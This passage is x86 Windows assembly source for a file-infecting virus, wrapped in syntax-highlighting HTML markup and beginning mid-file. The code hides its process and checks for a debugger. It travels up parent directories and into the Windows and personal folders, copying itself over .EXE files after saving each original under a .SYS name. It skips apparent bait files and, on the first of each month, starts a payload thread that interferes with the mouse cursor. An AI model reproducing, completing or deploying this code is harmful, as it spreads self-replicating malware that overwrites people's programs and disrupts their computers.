</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;ProcessID</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Restore Hostname &amp; Run Host-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">            </span><span class="sc1">;looks like "C:\MyC00lPr0gZ\veryCool\Fucking.EXE"</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;fuck the "</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusFile</span><span class="sc0">           </span><span class="sc1">;copy it to VirusFile to work with it</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">               </span><span class="sc1">;copy the string</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">               </span><span class="sc1">;get the point (...ddd.EXE") to clear "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">     </span><span class="sc1">;fuck it, now we have the path of the VirusFile</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusFile</span><span class="sc0">           </span><span class="sc1">;copy path of VirusFile to</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">            </span><span class="sc1">;HostFile, to work with it</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">               </span><span class="sc1">;get point to rename it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">5359532Eh</span><span class="sc0">       </span><span class="sc1">; SYS. ,now we have the path of the HostFile</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">           </span><span class="sc1">;check for debugger</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;null</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessInfo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartupInfo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                </span><span class="sc1">;create a new process</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">            </span><span class="sc1">;path for HostFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">            </span><span class="sc1">;run this file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Travel Directorys &amp; Infect them-------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">         </span><span class="sc1">;don't need anymore, use it to get the directory</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">               </span><span class="sc1">;first get the point</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;first get the path of current dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CDdotdot</span><span class="sc0">               </span><span class="sc1">;-"-</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFiles</span><span class="sc0">            </span><span class="sc1">;and infect files in this directory</span><span class="sc0">

</span><span class="sc5">InfectCDdotdot</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CDdotdot</span><span class="sc0">               </span><span class="sc1">;cd..</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;error code?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfectNext</span><span class="sc0">               </span><span class="sc1">;if yes search other dir's</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFiles</span><span class="sc0">            </span><span class="sc1">;infect it!</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InfectCDdotdot</span><span class="sc0">          </span><span class="sc1">;cd.. , infect, cd.. , ...</span><span class="sc0">

</span><span class="sc5">InfectNext</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;other directorys</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">           </span><span class="sc1">;often!</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WindowsFolder</span><span class="sc0">       </span><span class="sc1">;save there</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">       </span><span class="sc1">;easyer to get it with api, not registry</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WindowsFolder</span><span class="sc0">        </span><span class="sc1">;set directory</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetDirectory</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFiles</span><span class="sc0">            </span><span class="sc1">;and infect them</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPersonalDir</span><span class="sc0">         </span><span class="sc1">;infect them too</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PersonalFolder</span><span class="sc0">       </span><span class="sc1">;to set the directory</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetDirectory</span><span class="sc0">           </span><span class="sc1">;set it</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFiles</span><span class="sc0">            </span><span class="sc1">;infect them</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Payload, if Day 1. of Month-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc0">          </span><span class="sc1">;structure</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">          </span><span class="sc1">;get time</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wDay</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;first day of mounth?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FuckingDebugger</span><span class="sc0">         </span><span class="sc1">;if not exit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ThreadID</span><span class="sc0">            </span><span class="sc1">;the ID</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StopCursor</span><span class="sc0">          </span><span class="sc1">;the pklace where are the thread</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;close da handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">            </span><span class="sc1">;close it</span><span class="sc0">

</span><span class="sc5">GetCurrentPos</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;get current cursor pos</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">POINT</span><span class="sc0">           </span><span class="sc1">;structure</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCursorPos</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetCurrentPos</span><span class="sc0">           </span><span class="sc1">;again and again</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Exit &amp; stay (sic)---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FuckingDebugger</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Infect Files Procedure----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">InfectFiles</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;procedure</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">           </span><span class="sc1">;fuck you!</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">     </span><span class="sc1">;Win32 find data is kewl</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileMask</span><span class="sc0">            </span><span class="sc1">;'*.EXE',0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">         </span><span class="sc1">;find first</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;save da handle</span><span class="sc0">

</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;error?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindMore</span><span class="sc0">             </span><span class="sc1">;check other directory's</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">      </span><span class="sc1">;copy filename of founded file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TargetFile</span><span class="sc0">          </span><span class="sc1">;to rename and copy it</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;null</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TargetFile</span><span class="sc0">       </span><span class="sc1">;is it bait?</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">48d</span><span class="sc0">             </span><span class="sc1">;0</span><span class="sc0">

</span><span class="sc5">CheckBait</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">;check for bait</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;load one byte</span><span class="sc0">

</span><span class="sc5">CheckNum</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;check for a digit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">46d</span><span class="sc0">             </span><span class="sc1">; point?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Bait</span><span class="sc0">                 </span><span class="sc1">;don't infect, it's a fucking bait</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;a number?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ScanNext</span><span class="sc0">             </span><span class="sc1">;scan next digit</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">57d</span><span class="sc0">             </span><span class="sc1">;over 9</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">NoBait</span><span class="sc0">               </span><span class="sc1">;it's no bait, ...infect them</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;check next number (0,1,2,3,4,...)</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckNum</span><span class="sc0">                </span><span class="sc1">;again</span><span class="sc0">

</span><span class="sc5">ScanNext</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;scan next place</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;save the byte (edi,esi +1)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">48d</span><span class="sc0">             </span><span class="sc1">;restore ecx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckBait</span><span class="sc0">               </span><span class="sc1">;check ma</span><span class="sc0">

</span><span class="sc5">NoBait</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;go on with infection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TargetFile</span><span class="sc0">       </span><span class="sc1">;find point to rename</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">5359532Eh</span><span class="sc0">       </span><span class="sc1">;rename to .SYS</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;don't copy if file allready exist</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TargetFile</span><span class="sc0">          </span><span class="sc1">;copy to this path and filename (TargetFile.SYS)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">      </span><span class="sc1">;the real name to the fake name</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;error -&gt; file already exist</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FindNextPhile</span><span class="sc0">            </span><span class="sc1">;jmp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;copy always</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">      </span><span class="sc1">;copy the VirusFile over the real File</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusFile</span><span class="sc0">           </span><span class="sc1">;now HostName: xxx.SYS VirusName: xxx.EXE</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileCounter</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;counter -1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileCounter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;zero?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FuckingDebugger</span><span class="sc0">          </span><span class="sc1">;if yes exist</span><span class="sc0">

</span><span class="sc5">FindNextPhile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">           </span><span class="sc1">;antiman</span><span class="sc0">

</span><span class="sc5">Bait</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;search next file, last was a bait</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">     </span><span class="sc1">;get info from Win32FindData</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindHandle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;handle of file we search...</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindNext</span><span class="sc0">                </span><span class="sc1">;go up!</span><span class="sc0">

</span><span class="sc5">FindMore</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return and search in other directory's</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Anti Debug Procedure------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">AntiDebugger</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IsDebuggerPresent</span><span class="sc0">          </span><span class="sc1">;check for Debugger</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;if yes jmp to...</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FuckingDebugger</span><span class="sc0">         </span><span class="sc1">;FuckingDebugger:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Get Point Procedure-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetPoint</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;procedure</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">;check for point</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FoundPoint</span><span class="sc0">               </span><span class="sc1">;if point, return</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;if not check next place</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">
</span><span class="sc5">FoundPoint</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----CD.. Procedure------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CDdotdot</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;procedure</span><span class="sc0">
</span><span class="sc5">GetSlash</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;'\'</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ClearAfter</span><span class="sc0">               </span><span class="sc1">;if yes, clear al after the \
</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">          </span><span class="sc1">; are we at C:\
jz SetError             ;set a error code and exit procedure</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;esi -1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetSlash</span><span class="sc0">                </span><span class="sc1">;search again</span><span class="sc0">

</span><span class="sc5">ClearAfter</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;clear all after the slash</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;but don't clear \ (needed to travel!)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;fuck it all, fuck this world, fuck everything th...</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">;go in front of \
</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">         </span><span class="sc1">;now a path for the directory cd..</span><span class="sc0">

</span><span class="sc5">SetDirectory</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;procedure</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">       </span><span class="sc1">;set the dir</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return</span><span class="sc0">

</span><span class="sc5">SetError</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;we are at C:, can't cd.. anymore</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">;zero</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


